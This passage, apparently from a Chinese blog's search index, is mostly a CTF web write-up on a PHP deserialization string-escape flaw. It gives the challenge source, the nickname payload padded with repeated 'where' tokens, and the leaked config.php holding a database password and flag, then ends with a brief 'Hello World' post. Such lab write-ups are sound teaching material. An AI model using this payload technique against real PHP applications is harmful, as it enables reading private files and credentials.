<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class="line">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class="line">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    $flag &#x3D; &#39;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>查看index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">			header(<span class="string">'Location: profile.php'</span>);<span class="comment">//登入后跳转到profile.php</span></span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>查看profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;   </span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123; </span><br><span class="line">    header(<span class="string">'Location: update.php'</span>); <span class="comment">//$profile为空，跳转到update.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    $profile = unserialize($profile); <span class="comment">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));<span class="comment">//file_get_contents()此函数可以获得文件内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">    $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">    $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">    $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">    $user-&gt;update_profile($username, serialize($profile));<span class="comment">//将$profile序列化，执行过滤函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看update_profile()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile); </span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看filter()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); </span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; </span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//将  “ ‘ ”、 “\\\\” 替换成 “_” </span></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//将“ select|insert|update|delete|where” 替换成 "hacker"，返回替换后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在update_profile()，返回到profile.php.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile); <span class="comment">//反序列化$profile</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>序列化后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>要让$photo得到的文件是config.php也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>
<p>变成 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>
<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>
<p>因为nickname有长度限制使用数组可以绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>
<h3 id="0x03-开始操作"><a href="#0x03-开始操作" class="headerlink" title="0x03 开始操作"></a>0x03 开始操作</h3><p><img src="/pic/1.png" alt="1"> 传入参数</p>
<p>访问profile.php</p>
<p><img src="/pic/2.png" alt="2"></p>
<p>将base64解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>0CTF</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/19/hello-world/</url>
    <content><![CDATA[<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>
]]></content>
  </entry>
</search>
